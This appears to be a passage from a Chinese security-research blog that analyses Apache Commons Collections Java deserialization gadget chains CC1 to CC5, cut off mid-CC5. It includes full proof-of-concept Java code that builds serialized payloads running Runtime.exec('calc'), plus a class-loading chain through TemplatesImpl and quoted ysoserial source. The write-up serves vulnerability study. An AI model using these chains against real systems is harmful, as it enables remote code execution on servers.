<p>这个类用于和 ChainedTransformer 配合，ChainedTransformer需要传入Transformer类型的数组来链式调用，当我们需要一个Class类时，就需要把Class类包装成ConstantTransformer对象，传入Transformer数组，然后将其结果传入 InvokerTransformer 来调用我们指定的类的指定方法。</p>
<h2 id="构造Gadget"><a href="#构造Gadget" class="headerlink" title="构造Gadget"></a>构造Gadget</h2><p>以要执行Runtime.getRuntime().exec(“calc”)为例,对应的Sink和chain实例代码就是：</p>
<pre><code>Map hashMap = new HashMap();

ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
        new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
        new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
&#125;);

Map transformedMap = TransformedMap.decorate(hashMap, null, chain);

hashMap.put(&quot;test&quot;, &quot;test&quot;);
</code></pre>
<p>chain链执行流程：</p>
<pre><code>new ConstantTransformer(Runtime.class)
</code></pre>
<p>返回Runtime 的 Class 对象，传入到InvokerTransformer对象的transform方法中,相当于<code>InvokerTransformer.transform(Runtime.class)</code></p>
<pre><code>new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;)
</code></pre>
<p>调用Runtime.getMethod去查找getRuntime方法，返回了<code>Runtime.getRuntime</code>这个方法（Method类型）</p>
<pre><code>new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;)
</code></pre>
<p>调用<code>Runtime.getRuntime</code>（Method类型）的<code>invoke</code>方法，返回了<code>Runtime.getMethod()</code>Runtime对象</p>
<pre><code>new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
</code></pre>
<p>调用Runtime对象的<code>exec</code>方法，去执行calc</p>
<p>然后使用decorate 方法将 ChainedTransformer 设置为 map 的装饰器处理方法后，当调用 TransformedMap 的 put&#x2F;setValue 等方法时会触发 Transformer 链的调用处理。</p>
<p>截止到这里，我们利用 CC 库成功构造了 sink gadget 和 chain gadget，接下来我们需要找到一个 kick-off gadget：一个类重写了 readObject ，在反序列化时可以改变 map 的值。</p>
<p><code>sun.reflect.annotation.AnnotationInvocationHandler</code>恰好满足我们的要求，这个类实现了 InvocationHandler 接口，原本是用于 JDK 对于注解形式的动态代理。</p>
<p><img src="/images/20230425203156.png"></p>
<p><code>memberTypes</code>里面存储了注解属性的Class Map，key为属性名，value为属性的类型<br><code>memberValues</code>里面存储了注解属性的Value Map，key为属性名，value为属性的值<br>遍历<code>memberValues</code>，如果memberValue中的key也在memberTypes中，并且value既不是memberType的实例，也不是ExceptionProxy的子类对象，就会调用 setValue 方法写入值。</p>
<p><code>memberTypes</code>是由<code>annotationType</code>的<code>memberTypes</code>方法得到的，<code>annotationType</code>是由<code>AnnotationType.getInstance(type)</code>得到的，而type和memberValues都是在构造器中传入，type需要是Annotation 实现类的 Class 对象，可控。</p>
<p><img src="/images/20230425204913.png"></p>
<p>这样kick-off也有了，完整的Gadget链：</p>
<ul>
<li>构造一个 AnnotationInvocationHandler 实例，初始化时传入一个注解类和一个 Map，这个 Map 的 key 中要有注解类中存在的属性，但是值不是对应的实例，也不是 ExceptionProxy 对象。</li>
<li>这个 Map 由 TransformedMap 封装，并调用自定义的 ChainedTransformer 进行装饰。</li>
<li>ChainedTransformer 中写入多个 Transformer 实现类，用于链式调用，完成恶意操作。</li>
</ul>
<p>实现代码：</p>
<pre><code>public class CC1WithTransformedMap &#123;

    public static String fileName = &quot;CC1withTransformedMap.bin&quot;;

    public static void main(String[] args) throws ClassNotFoundException, InvocationTargetException,
            InstantiationException, IllegalAccessException, IOException &#123;

        Map hashMap = new HashMap();
        // 这里 key 一定是 下面实例化 AnnotationInvocationHandler 时传入的注解类中存在的属性值
        // 并且这里的值的一定不是属性值的类型
        hashMap.put(&quot;comments&quot;, 2);

        // 结合 ChainedTransformer
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;)
        &#125;);


        Map transformedMap = TransformedMap.decorate(hashMap, null, chain);
        Class&lt;?&gt; c              = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);

        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Generated.class, transformedMap);

        SerializeUtil.write(handler, fileName);
        SerializeUtil.read(fileName);
    &#125;
&#125;
</code></pre>
<p><code>Generated.class</code>可以替换为任意注解类，只要修改<code>memberValues</code>的key为注解类的一个属性名就行。</p>
<h2 id="LazyMap思路"><a href="#LazyMap思路" class="headerlink" title="LazyMap思路"></a>LazyMap思路</h2><p>LazyMap 通过 <strong>get</strong> 方法获取不到 key 的时候触发 Transformer。<br>而<code> AnnotationInvocationHandler</code>的invoke方法可以触发 memberValues 的 <strong>get</strong> 方法。</p>
<p><img src="/images/20230425210027.png"></p>
<p>这里用到了动态代理，被动态代理的对象调用任意方法都会调用对应的InvocationHandler 的 <code>invoke</code> 方法。</p>
<p>构造思路,在使用带有装饰器的 LazyMap 初始化 AnnotationInvocationHandler 之前，先使用 InvocationHandler 代理一下 LazyMap，这样反序列化 AnnotationInvocationHandler 时，调用 LazyMap 值的 任意方法之前会调用代理类的 invoke 方法，触发 LazyMap 的 get 方法。</p>
<p>有点乱，整理一下：</p>
<p>反序列化调用readObject方法，readObject方法中memberValues存放着我们LazyMap用InvocationHandler代理的代理类，当执行到memberValues.entrySet()方法时，触发InvocationHandler的invoke方法</p>
<p><img src="/images/20230425214833.png"></p>
<p>invoke方法中，会去调用<code>memberValues.get(member)</code>也就是我们LazyMap的get方法，由于map中没有entrySet这个key，触发chain链</p>
<p><img src="/images/20230425215420.png"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是 CC1 链分析的全部内容了，最后总结一下。</p>
<ol>
<li>利用说明：<ul>
<li>利用 AnnotationInvocationHandler 在反序列化时会触发 Map 的 get&#x2F;set 等操作，配合 TransformedMap&#x2F;LazyMap 在执行 Map 对象的操作时会根据不同情况调用 Transformer 的转换方法，最后结合了 ChainedTransformer 的链式调用、InvokerTransformer 的反射执行完成了恶意调用链的构成。其中 LazyMap 的触发还用到了动态代理机制。</li>
</ul>
</li>
<li>Gadget 总结：<ul>
<li>kick-off gadget：<code>sun.reflect.annotation.AnnotationInvocationHandler#readObject()</code></li>
<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
<li>chain gadget：<code>org.apache.commons.collections.functors.ChainedTransformer#transform()</code></li>
</ul>
</li>
</ol>
<h1 id="CommonsCollections2"><a href="#CommonsCollections2" class="headerlink" title="CommonsCollections2"></a>CommonsCollections2</h1><h2 id="依赖版本"><a href="#依赖版本" class="headerlink" title="依赖版本"></a>依赖版本</h2><pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
    &lt;version&gt;4.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<h2 id="前置知识-1"><a href="#前置知识-1" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="PriorityQueue"><a href="#PriorityQueue" class="headerlink" title="PriorityQueue"></a>PriorityQueue</h3><p>PriorityQueue 优先级队列是基于优先级堆（a priority heap）的一种特殊队列，他给每个元素定义“优先级”，这样取出数据的时候会按照优先级来取。默认情况下，优先级队列会根据自然顺序对元素进行排序。</p>
<p>因此，放入PriorityQueue的元素，必须实现 Comparable 接口，PriorityQueue 会根据元素的排序顺序决定出队的优先级。如果没有实现 Comparable 接口，PriorityQueue 还允许我们提供一个 Comparator 对象来判断两个元素的顺序。<br>s<br>PriorityQueue 支持反序列化，在重写的 readObject 方法中，将数据反序列化到 <code>queue</code> 中之后，会调用 <code>heapify()</code> 方法来对数据进行排序。</p>
<p><img src="/images/20230425215752.png"></p>
<p><code>heapify()</code> 方法调用 <code>siftDown()</code> 方法，在 comparator 属性不为空的情况下，调用 <code>siftDownUsingComparator()</code> 方法</p>
<p><img src="/images/20230425215850.png"></p>
<p><img src="/images/20230425215843.png"></p>
<p>在 <code>siftDownUsingComparator()</code> 方法中，会调用 comparator 的 <code>compare()</code> 方法来进行优先级的比较和排序。</p>
<p><img src="/images/20230425220033.png"></p>
<h3 id="TransformingComparator"><a href="#TransformingComparator" class="headerlink" title="TransformingComparator"></a>TransformingComparator</h3><p>TransformingComparator 是触发这个漏洞的一个关键点，他将 Transformer 执行点和 PriorityQueue 触发点连接了起来。</p>
<p>TransformingComparator 看类名就类似 TransformedMap，实际作用也类似，用 Tranformer 来装饰一个 Comparator。也就是说，待比较的值将先使用 Tranformer 转换，再传递给 Comparator 比较。</p>
<p>TransformingComparator 初始化时配置 Transformer 和 Comparator，如果不指定 Comparator，则使用 <code>ComparableComparator.&lt;Comparable&gt;comparableComparator()</code>。</p>
<p><img src="/images/20230425220323.png"></p>
<p>在调用 TransformingComparator 的 <code>compare</code> 方法时，可以看到调用了 <code>this.transformer.transform()</code> 方法对要比较的两个值进行转换，然后再调用 compare 方法比较。</p>
<p><img src="/images/20230425220202.png"></p>
<h2 id="构造攻击"><a href="#构造攻击" class="headerlink" title="构造攻击"></a>构造攻击</h2><ul>
<li>kick-off点：PriorityQueue</li>
<li>chain点：ChainedTransformer</li>
<li>sink点：InvokerTransformer</li>
</ul>
<p>代码如下</p>
<pre><code>public class CC2WithChain &#123;

    public static String fileName = &quot;CC2WithChain.bin&quot;;

    public static void main(String[] args) throws ClassNotFoundException, NoSuchFieldException, IllegalAccessException, IOException &#123;

        // 初始化 Transformer
        ChainedTransformer chain = new ChainedTransformer(new ConstantTransformer(Runtime.class),
                new InvokerTransformer(&quot;getMethod&quot;, new Class[]&#123;String.class, Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;, null&#125;),
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class, Object[].class&#125;, new Object[]&#123;null, null&#125;),
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new Object[]&#123;&quot;calc&quot;&#125;));

        TransformingComparator comparator = new TransformingComparator(chain);

        // 在初始化时不带入 comparator，而是
        PriorityQueue&lt;String&gt; queue = new PriorityQueue&lt;&gt;(2);
        queue.add(&quot;1&quot;);
        queue.add(&quot;2&quot;);

        Field field = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
        field.setAccessible(true);
        field.set(queue, comparator);

        SerializeUtil.write(queue, fileName);
        SerializeUtil.read(fileName);
    &#125;

&#125;
</code></pre>
<p>这里需要注意的是，在初始化 PriorityQueue 时没有指定 comparator，而是使用反射写入，这是为了避免在向 queue 中添加内容时触发排序而导致触发恶意 payload。</p>
<h2 id="ysoserial-CC2"><a href="#ysoserial-CC2" class="headerlink" title="ysoserial CC2"></a>ysoserial CC2</h2><p>ysoserial 的 CC2 没有使用 ChainedTransformer，而直接使用了 InvokerTransformer 配合 TemplatesImpl 直接加载恶意类的 bytecode。</p>
<h3 id="TemplatesImpl"><a href="#TemplatesImpl" class="headerlink" title="TemplatesImpl"></a>TemplatesImpl</h3><p>TemplatesImpl 类位于com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl，实现了 Serializable 接口，因此它可以被序列化。</p>
<p>看到<code>newTransformer</code>，调用了<code>getTransletInstance()</code> 方法。</p>
<p><img src="/images/20230425221326.png"></p>
<p>该类中存在一个成员属性 <code>_class</code>，是一个 Class 类型的数组，数组里下标为<code>_transletIndex</code> 的类会在 <code>getTransletInstance()</code> 方法中使用 <code>newInstance()</code> 实例化，如果<code>_class</code>、<code>_transletIndex</code>可控，就可以自定义实例化的类。</p>
<p><img src="/images/20230425221632.png"></p>
<p>看到<code>defineTransletClasses()</code>方法，会调用自定义的 ClassLoader 去加载 <code>_bytecodes</code> 中的 <code>byte[]</code> ，并且如果这个类的父类为 <code>ABSTRACT_TRANSLET</code> 也就是<code>com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet</code>，就会将类成员属性的<code>_transletIndex</code> 设置为当前的i。而<code>defineTransletClasses()</code>在之前<code>getTransletInstance()</code>类中_class不为空时调用，所以形成了可控的调用链。</p>
<p><img src="/images/!%5B%5D(images/20230425221743.png).png"></p>
<p>触发逻辑总结：</p>
<ul>
<li>创建恶意的 TemplatesImpl 对象，写入 _bytecodes、_name 属性，完成调用 newTransformer 方法触发恶意类的实例化的条件。</li>
<li>创建 PriorityQueue，由于 TemplatesImpl 不是 Comparable 对象，需要反射将恶意的 TemplatesImpl 对象写入到 PriorityQueue 的 queue 中。</li>
<li>使用 InvokerTransformer （调用被装饰对象的 newTransformer 方法）创建 TransformingComparator ，并将其赋予到 PriorityQueue 中。</li>
</ul>
<p>恶意代码：</p>
<pre><code>public class CC2WithTemplatesImpl &#123;

    public static String fileName = &quot;CC2WithTemplatesImpl.bin&quot;;

    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;

        // 读取恶意类 bytes[]
        InputStream inputStream = CC2WithTemplatesImpl.class.getResourceAsStream(&quot;ClassForCC2.class&quot;);
        byte[]      bytes       = new byte[inputStream.available()];
        inputStream.read(bytes);

        // 初始化 PriorityQueue
        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;&gt;(2);
        queue.add(&quot;1&quot;);
        queue.add(&quot;2&quot;);


        // 初始化 TemplatesImpl 对象
        TemplatesImpl tmpl      = new TemplatesImpl();
        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);
        // _name 不能为空
        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
        name.setAccessible(true);
        name.set(tmpl, &quot;1azy&quot;);

        Field field = PriorityQueue.class.getDeclaredField(&quot;queue&quot;);
        field.setAccessible(true);
        Object[] objects = (Object[]) field.get(queue);
        objects[0] = tmpl;

        // 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
        // 这个类是 public 的，方便调用
        InvokerTransformer transformer = new InvokerTransformer(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);
        TransformingComparator comparator  = new TransformingComparator(transformer);

        Field field2 = Class.forName(&quot;java.util.PriorityQueue&quot;).getDeclaredField(&quot;comparator&quot;);
        field2.setAccessible(true);
        field2.set(queue, comparator);

        SerializeUtil.write(queue, fileName);
        SerializeUtil.read(fileName);

    &#125;
&#125;

恶意类构造如下，请先编译成class文件：

public class ClassForCC2 extends AbstractTranslet &#123;
    static &#123;
        try &#123;
            Runtime.getRuntime().exec(&quot;calc&quot;);
        &#125; catch (IOException e) &#123;
            throw new RuntimeException(e);
        &#125;
    &#125;

    public static void main(String[] args) &#123;

    &#125;



    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;

    &#125;

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;

    &#125;
&#125;
</code></pre>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><ol>
<li>利用说明：<ul>
<li>利用 PriorityQueue 在反序列化后会对队列进行优先级排序的特点，为其指定 TransformingComparator 排序方法，并在其中为其添加 Transforer，与 CC1 类似，主要的触发位置还是 InvokerTransformer。</li>
</ul>
</li>
<li>Gadget 总结：<ul>
<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
<li>chain gadget：<code>org.apache.commons.collections4.comparators.TransformingComparator#compare()</code></li>
</ul>
</li>
</ol>
<h1 id="CommonsCollections3"><a href="#CommonsCollections3" class="headerlink" title="CommonsCollections3"></a>CommonsCollections3</h1><p>CC3 官方描述为 CC1 的变种，其中能看到 CC1 和 CC2 的部分影子，但是部分技术细节并不相同。</p>
<p>在 CC1 中，使用了 AnnotationInvocationHandler 对 LazyMap 进行代理，在反序列化时触发 LazyMap 的 get 方法，并对 LazyMap 装饰 Transformer 触发漏洞。</p>
<p>在 CC2 中，使用 TemplatesImpl 的 newTransformer 方法触发实例化恶意类触发漏洞，方法的调用则是使用了 InvokerTransformer 反射调用。</p>
<p>而在 CC3 中，使用了 CC1 和 LazyMap 和 CC3 的 TemplatesImpl，中间寻找了其他的触发 newTransformer 的实现方式。</p>
<h2 id="前置知识-2"><a href="#前置知识-2" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="TrAXFilter"><a href="#TrAXFilter" class="headerlink" title="TrAXFilter"></a>TrAXFilter</h3><p>在 SAX API 中提供了一个过滤器接口 <code>org.xml.sax.XMLFilter</code>，XMLFilterImpl 是对它的缺省实现，使用过滤器进行应用程序开发时，只要继承 XMLFilterImpl，就可以方便的实现自己的功能。</p>
<p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter</code> 是对 XMLFilterImpl 的实现，在其基础上扩展了 Templates&#x2F;TransformerImpl&#x2F;TransformerHandlerImpl 属性，</p>
<p>TrAXFilter 在实例化时接收 Templates 对象，并调用其 newTransformer 方法，这就可以触发我们的 TemplatesImpl 的攻击 payload 了。</p>
<p><img src="/images/20230425222728.png"></p>
<h3 id="InstantiateTransformer"><a href="#InstantiateTransformer" class="headerlink" title="InstantiateTransformer"></a>InstantiateTransformer</h3><p>有了上述 gadget ，接下来的重点就是需要我们实例化这个 TrAXFilter，实例化我们当然可以使用 InvokerTransformer 反射拿到 Constructor 再 newInstance，但是同样地可以直接使用另外一个 Transformer：InstantiateTransformer。</p>
<p>Commons Collections 提供了 InstantiateTransformer 用来通过反射创建类的实例，可以看到 <code>transform()</code> 方法实际上接收一个 Class 类型的对象，通过 <code>getConstructor</code> 获取构造方法，并通过 <code>newInstance</code> 创建类实例。</p>
<p><img src="/images/20230425222809.png"></p>
<p>反射需要的 iParamTypes 参数类型、iArgs 参数值则在 InstantiateTransformer 初始化时赋值。</p>
<p><img src="/images/20230425222822.png"></p>
<h2 id="构造攻击-1"><a href="#构造攻击-1" class="headerlink" title="构造攻击"></a>构造攻击</h2><pre><code>public class CC3 &#123;

    public static String fileName = &quot;CC3.bin&quot;;

    public static void main(String[] args) throws IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, InvocationTargetException, InstantiationException &#123;

        // 读取恶意类 bytes[]
        InputStream inputStream = CC3.class.getResourceAsStream(&quot;ClassForCC2.class&quot;);
        byte[]      bytes       = new byte[inputStream.available()];
        inputStream.read(bytes);

        // 初始化 TemplatesImpl 对象
        TemplatesImpl tmpl      = new TemplatesImpl();
        Field         bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);
        // _name 不能为空
        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
        name.setAccessible(true);
        name.set(tmpl, &quot;su18&quot;);


        // 结合 ChainedTransformer
        ChainedTransformer chain = new ChainedTransformer(new Transformer[]&#123;
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;tmpl&#125;)
        &#125;);

        // 初始化 LazyMap
        Map lazyMap     = LazyMap.decorate(new HashMap(),  chain);
        Class&lt;?&gt;       c           = Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);
        Constructor&lt;?&gt; constructor = c.getDeclaredConstructors()[0];
        constructor.setAccessible(true);

        // 创建携带着 LazyMap 的 AnnotationInvocationHandler 实例
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, lazyMap);
        // 创建LazyMap的动态代理类实例
        Map mapProxy = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(), LazyMap.class.getInterfaces(), handler);

        // 使用动态代理初始化 AnnotationInvocationHandler
        InvocationHandler invocationHandler = (InvocationHandler) constructor.newInstance(Target.class, mapProxy);

        SerializeUtil.write(invocationHandler, fileName);
        SerializeUtil.read(fileName);
    &#125;

&#125;
</code></pre>
<h1 id="CommonsCollections4"><a href="#CommonsCollections4" class="headerlink" title="CommonsCollections4"></a>CommonsCollections4</h1><h2 id="依赖版本-1"><a href="#依赖版本-1" class="headerlink" title="依赖版本"></a>依赖版本</h2><pre><code>&lt;dependency&gt;
    &lt;groupId&gt;org.apache.commons&lt;/groupId&gt;
    &lt;artifactId&gt;commons-collections4&lt;/artifactId&gt;
    &lt;version&gt;4.0&lt;/version&gt;
&lt;/dependency&gt;
</code></pre>
<p>ysoserial的CC4是CC2和CC3的结合，用 PriorityQueue 的 TransformingComparator 触发 ChainedTransformer（CC2），而chain中利用了 InstantiateTransformer 实例化 TrAXFilter 类，并调用 TemplatesImpl 的 newTransformer 方法实例化恶意类字节码触发漏洞（CC3）<br>。</p>
<pre><code>public class CommonsCollections4 implements ObjectPayload&lt;Queue&lt;Object&gt;&gt; &#123;

    public Queue&lt;Object&gt; getObject(final String command) throws Exception &#123;
        Object templates = Gadgets.createTemplatesImpl(command);

        ConstantTransformer constant = new ConstantTransformer(String.class);

        // mock method name until armed
        Class[] paramTypes = new Class[] &#123; String.class &#125;;
        Object[] args = new Object[] &#123; &quot;foo&quot; &#125;;
        InstantiateTransformer instantiate = new InstantiateTransformer(
                paramTypes, args);

        // grab defensively copied arrays
        paramTypes = (Class[]) Reflections.getFieldValue(instantiate, &quot;iParamTypes&quot;);
        args = (Object[]) Reflections.getFieldValue(instantiate, &quot;iArgs&quot;);

        ChainedTransformer chain = new ChainedTransformer(new Transformer[] &#123; constant, instantiate &#125;);

        // create queue with numbers
        PriorityQueue&lt;Object&gt; queue = new PriorityQueue&lt;Object&gt;(2, new TransformingComparator(chain));
        queue.add(1);
        queue.add(1);

        // swap in values to arm
        Reflections.setFieldValue(constant, &quot;iConstant&quot;, TrAXFilter.class);
        paramTypes[0] = Templates.class;
        args[0] = templates;

        return queue;
    &#125;
</code></pre>
<p>这里补充一个对 PriorityQueue 的替代链 TreeBag。</p>
<h2 id="补充前置知识"><a href="#补充前置知识" class="headerlink" title="补充前置知识"></a>补充前置知识</h2><h3 id="TreeBag-amp-TreeMap"><a href="#TreeBag-amp-TreeMap" class="headerlink" title="TreeBag &amp; TreeMap"></a>TreeBag &amp; TreeMap</h3><p>在 CC2 中，使用了优先级队列 PriorityQueue 反序列化时会调用 comparator 的 compare 方法的特性，配合 TransformingComparator 触发 transformer。</p>
<p>除了 PriorityQueue，还能否找到其他的提供排序的类，在反序列化时会调用到比较器呢？于是找到了 TreeBag。</p>
<p>对于 Bag 我很陌生，所以这里简单介绍一下。</p>
<p>Bag 接口继承自 Collection 接口，定义了一个集合，该集合会记录对象在集合中出现的次数。它有一个子接口 SortedBag，定义了一种可以对其唯一不重复成员排序的 Bag 类型。</p>
<p>TreeBag 是对 SortedBag 的一个标准实现。TreeBag 使用 TreeMap 来储存数据，并使用指定 Comparator 来进行排序。</p>
<p>TreeBag 继承自 AbstractMapBag，实现了 SortedBag 接口。初始化 TreeBag 时，会创建一个新的 TreeMap 储存在成员变量 map 里，而排序使用的 Comparator 则直接储存在 TreeMap 中。</p>
<p>看到TreeBag#readObject，会调用super.doReadObject</p>
<p><img src="/images/20230504160412.png"></p>
<p>调用 put 向 TreeMap中存放数据</p>
<p><img src="/images/20230504160549.png"></p>
<p>在TreeMap#put中会调用compare去比较key</p>
<p><img src="/images/20230504160703.png"></p>
<p>而compare中就会调用<code>comparator</code> 进行比较，可以使用 <code>TransformingComparator</code> 触发后续的逻辑。</p>
<p><img src="/images/20230504160744.png"></p>
<h2 id="攻击构造"><a href="#攻击构造" class="headerlink" title="攻击构造"></a>攻击构造</h2><pre><code>public class CC4WithTreeBag &#123;

    public static String fileName = &quot;CC4WithTreeBag.bin&quot;;

    public static void main(String[] args) throws Exception &#123;

        // 读取恶意类 bytes[]
        InputStream inputStream = CC4WithTreeBag.class.getResourceAsStream(&quot;ClassForCC2.class&quot;);
        byte[]      bytes       = new byte[inputStream.available()];
        inputStream.read(bytes);

        // 初始化 TemplatesImpl 对象
        TemplatesImpl tmpl      = new TemplatesImpl();
        Field bytecodes = TemplatesImpl.class.getDeclaredField(&quot;_bytecodes&quot;);
        bytecodes.setAccessible(true);
        bytecodes.set(tmpl, new byte[][]&#123;bytes&#125;);
        // _name 不能为空
        Field name = TemplatesImpl.class.getDeclaredField(&quot;_name&quot;);
        name.setAccessible(true);
        name.set(tmpl, &quot;1azy&quot;);

        // 用 InvokerTransformer 来反射调用 TemplatesImpl 的 newTransformer 方法
        // 这个类是 public 的，方便调用
        Transformer transformer = new InvokerTransformer(&quot;toString&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);
        TransformingComparator comparator  = new TransformingComparator(transformer);

        // prepare CommonsCollections object entry point
        TreeBag tree = new TreeBag(comparator);
        tree.add(tmpl);

        Field field = InvokerTransformer.class.getDeclaredField(&quot;iMethodName&quot;);
        field.setAccessible(true);
        field.set(transformer, &quot;newTransformer&quot;);

        SerializeUtil.write(tree, fileName);
        SerializeUtil.read(fileName);
    &#125;
&#125;
</code></pre>
<h2 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h2><p>ysoserial CC4：</p>
<ol>
<li>利用说明：<ul>
<li>使用 PriorityQueue 反序列化时触发的 TransformingComparator 的 compare 方法，就会触发 ChainedTransformer 的 tranform 方法链，其中利用 InstantiateTransformer 实例化 TrAXFilter 类，此类实例化时会调用 TemplatesImpl 的 newTransformer 实例化恶意类，执行恶意代码。</li>
</ul>
</li>
<li>Gadget 总结：<ul>
<li>kick-off gadget：<code>java.util.PriorityQueue#readObject()</code></li>
<li>sink gadget：<code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer()</code></li>
<li>chain gadget：<code>org.apache.commons.collections.functors.InstantiateTransformer#transform()</code></li>
</ul>
</li>
</ol>
<p>TreeBag 总结：</p>
<ol>
<li>利用说明：<ul>
<li>用 TreeBag 代替 PriorityQueue 触发 TransformingComparator，后续依旧使用 Transformer 的调用链。</li>
</ul>
</li>
<li>Gadget 总结：<ul>
<li>kick-off gadget：<code>org.apache.commons.collections4.bag.TreeBag#readObject</code></li>
<li>sink gadget：<code>org.apache.commons.collections.functors.InvokerTransformer#transform()</code></li>
<li>chain gadget：<code>java.util.TreeMap#put()</code></li>
</ul>
</li>
</ol>
<h1 id="CommonsCollections5"><a href="#CommonsCollections5" class="headerlink" title="CommonsCollections5"></a>CommonsCollections5</h1><p>CC5 依旧是 LazyMap 加 ChainedTransformer 的触发模式，只不过不再使用 AnnotationInvocationHandler 的动态代理来触发 LazyMap 的 get ，而是找到了其他的方式。</p>
<blockquote>
<p>jdk 在 1.8 之后对 AnnotationInvocationHandler 类进行了修复，所以在 jdk 1.8 版本就必须找出能替代 AnnotationInvocationHandler 的新的可以利用的类。</p>
</blockquote>
<h2 id="依赖版本-2"><a href="#依赖版本-2" class="headerlink" title="依赖版本"></a>依赖版本</h2><blockquote>
<p>commons-collections : 3.1～3.2.1<br>jdk 8u76 without a security manager</p>
</blockquote>
<h2 id="前置知识-3"><a href="#前置知识-3" class="headerlink" title="前置知识"></a>前置知识</h2><h3 id="TiedMapEntry"><a href="#TiedMapEntry" class="headerlink" title="TiedMapEntry"></a>TiedMapEntry</h3><p><code>org.apache.commons.collections.keyvalue.TiedMapEntry</code> 是一个 <code>Map.Entry</code> 的实现类，从名称中可以看到，这是一个绑定了底层 map 的 Entry，用来使一个 map entry 对象拥有在底层修改 map 的功能。</p>
<p>TiedMapEntry 中有一个成员属性 Map，这就是 <code>Map.Entry</code> 的底层 map，TiedMapEntry 的 <code>getValue()</code> 方法会调用底层 map 的 <code>get()</code> 方法，我们可以用来触发 LazyMap 的 get。那谁会调用 <code>getValue()</code> 方法呢？我们发现 TiedMapEntry 的 equals&#x2F;hashCode&#x2F;toString 都可以触发。</p>
<pre><code>public String toString() &#123;
    return getKey() + &quot;=&quot; + getValue();
&#125;

public Object getValue() &#123;
    return map.get(key);
&#125;
</code></pre>
<p>接下来需要找到一个类在反序列化时会触发 TiedMapEntry 的 toString() 方法。</p>
<h3 id="BadAttributeValueExpException"><a href="#BadAttributeValueExpException" class="headerlink" title="BadAttributeValueExpException"></a>BadAttributeValueExpException</h3><p>于是找到了 <code>javax.management.BadAttributeValueExpException</code> 这个类，反序列化读取 val，当 <code>System.getSecurityManager() == null</code> 或 valObj 是除了 String 的其他基础类型时会调用 valObj 的 <code>toString()</code> 方法，完成上面 TiedMapEntry 的构造。</p>
<pre><code>private void readObject(ObjectInputStream ois) throws IOException, ClassNotFoundException &#123;
        ObjectInputStream.GetField gf = ois.readFields();
        Object valObj = gf.get(&quot;val&quot;, null);

        if (valObj == null) &#123;
            val = null;
        &#125; else if (valObj instanceof String) &#123;
            val= valObj;
